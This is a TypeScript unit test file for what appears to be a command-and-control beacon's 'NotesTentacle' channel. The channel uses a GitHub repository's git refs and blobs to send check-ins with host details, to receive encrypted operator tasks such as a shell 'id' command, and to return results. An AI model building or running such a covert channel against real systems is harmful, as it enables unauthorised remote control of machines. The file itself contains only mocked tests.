import { describe, it, expect, mock, beforeEach } from "bun:test";

// Mock must be declared before the module is imported
const mockGit = {
  getRef:     mock(async () => ({ data: { object: { sha: "sha1" } } })),
  createBlob: mock(async () => ({ data: { sha: "blob-sha" } })),
  getBlob:    mock(async () => ({ data: { content: "", encoding: "utf-8" } })),
  createRef:  mock(async () => ({})),
  updateRef:  mock(async () => ({})),
  deleteRef:  mock(async () => ({})),
};
const mockActions = {
  getRepoVariable: mock(async () => ({ data: { value: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" } })),
};
const mockRepos = { get: mock(async () => ({})) };

mock.module("@octokit/rest", () => ({
  Octokit: class {
    hook = { wrap: (_name: string, _fn: Function) => {} };
    rest = { git: mockGit, actions: mockActions, repos: mockRepos };
  },
}));

import { NotesTentacle } from "../tentacles/NotesTentacle.ts";
import { generateKeyPair, bytesToBase64, encryptBox } from "../crypto/sodium.ts";
import type { BeaconConfig } from "../types.ts";

async function makeConfig(): Promise<BeaconConfig> {
  const kp = await generateKeyPair();
  return {
    id: "abcd1234-5678-90ab-cdef-1234567890ab",
    repo: { owner: "testowner", name: "testrepo" },
    token: "ghp_test",
    tentaclePriority: ["notes"],
    sleepSeconds: 60,
    jitter: 0.3,
    operatorPublicKey: new Uint8Array(32),
    beaconKeyPair: kp,
  };
}

const PAYLOAD = {
  beaconId: "abcd1234-5678-90ab-cdef-1234567890ab",
  publicKey: "",
  hostname: "host", username: "user", os: "linux", arch: "x64",
  pid: 1234, checkinAt: new Date().toISOString(),
};

describe("NotesTentacle", () => {
  beforeEach(() => {
    mockGit.getRef.mockClear();
    mockGit.createBlob.mockClear();
    mockGit.getBlob.mockClear();
    mockGit.createRef.mockClear();
    mockGit.updateRef.mockClear();
    mockGit.deleteRef.mockClear();
    mockActions.getRepoVariable.mockClear();
    mockRepos.get.mockClear();
  });

  it("isAvailable returns true when repo is accessible", async () => {
    const t = new NotesTentacle(await makeConfig());
    expect(await t.isAvailable()).toBe(true);
    expect(mockRepos.get).toHaveBeenCalledTimes(1);
  });

  it("isAvailable returns false on repo access error", async () => {
    mockRepos.get.mockImplementationOnce(async () => { throw Object.assign(new Error("403"), { status: 403 }); });
    const t = new NotesTentacle(await makeConfig());
    expect(await t.isAvailable()).toBe(false);
  });

  it("checkin sends ACK blob and returns [] when no task ref exists (404)", async () => {
    mockGit.getRef.mockImplementationOnce(async () => {
      throw Object.assign(new Error("Not Found"), { status: 404 });
    });
    const t = new NotesTentacle(await makeConfig());
    const tasks = await t.checkin(PAYLOAD);
    expect(tasks).toEqual([]);
    expect(mockGit.createBlob).toHaveBeenCalledTimes(1);   // ACK blob only
    expect(mockGit.deleteRef).not.toHaveBeenCalled();
  });

  it("checkin returns [] when task SHA is unchanged since last poll", async () => {
    const cfg = await makeConfig();
    const t = new NotesTentacle(cfg);
    // First checkin — sends ACK, reads SHA "sha1"
    mockGit.getRef.mockResolvedValueOnce({ data: { object: { sha: "sha1" } } });
    mockGit.getBlob.mockResolvedValueOnce({ data: { content: "bad", encoding: "utf-8" } });
    await t.checkin(PAYLOAD);
    mockGit.createBlob.mockClear();
    mockGit.getBlob.mockClear();
    // Second checkin — same SHA
    mockGit.getRef.mockResolvedValueOnce({ data: { object: { sha: "sha1" } } });
    const tasks = await t.checkin(PAYLOAD);
    expect(tasks).toEqual([]);
    expect(mockGit.getBlob).not.toHaveBeenCalled();
  });

  it("checkin decrypts tasks when SHA changes (full crypto round-trip)", async () => {
    const operatorKp = await generateKeyPair();
    const cfg = await makeConfig();
    const opPubB64 = await bytesToBase64(operatorKp.publicKey);
    mockActions.getRepoVariable.mockResolvedValue({ data: { value: opPubB64 } });

    const taskList = [{ taskId: "t1", kind: "shell" as const, args: { cmd: "id" }, ref: "r1" }];
    const encrypted = await encryptBox(
      JSON.stringify(taskList),
      cfg.beaconKeyPair.publicKey,
      operatorKp.secretKey,
    );
    const blobContent = JSON.stringify(encrypted);

    // First checkin: ACK (no prior SHA), task ref returns "sha2"
    mockGit.getRef.mockResolvedValueOnce({ data: { object: { sha: "sha2" } } });
    mockGit.getBlob.mockResolvedValueOnce({ data: { content: blobContent, encoding: "utf-8" } });
    mockGit.deleteRef.mockResolvedValueOnce({});

    const t = new NotesTentacle(cfg);
    const tasks = await t.checkin({ ...PAYLOAD, beaconId: cfg.id });
    expect(tasks).toHaveLength(1);
    expect(tasks[0]!.taskId).toBe("t1");
    expect(mockGit.deleteRef).toHaveBeenCalledTimes(1);
  });

  it("submitResult creates blob and upserts result ref", async () => {
    mockGit.updateRef.mockImplementationOnce(async () => { throw Object.assign(new Error("Not Found"), { status: 422 }); });
    const t = new NotesTentacle(await makeConfig());
    await t.submitResult({
      taskId: "t1", beaconId: "abcd1234-5678-90ab-cdef-1234567890ab",
      success: true, output: "hello", completedAt: new Date().toISOString(),
    });
    expect(mockGit.createBlob).toHaveBeenCalledTimes(1);
    // Either createRef or updateRef should have been called
    const refCalled = mockGit.createRef.mock.calls.length + mockGit.updateRef.mock.calls.length;
    expect(refCalled).toBeGreaterThan(0);
  });

  it("teardown resolves without error", async () => {
    const t = new NotesTentacle(await makeConfig());
    await expect(t.teardown()).resolves.toBeUndefined();
  });
});
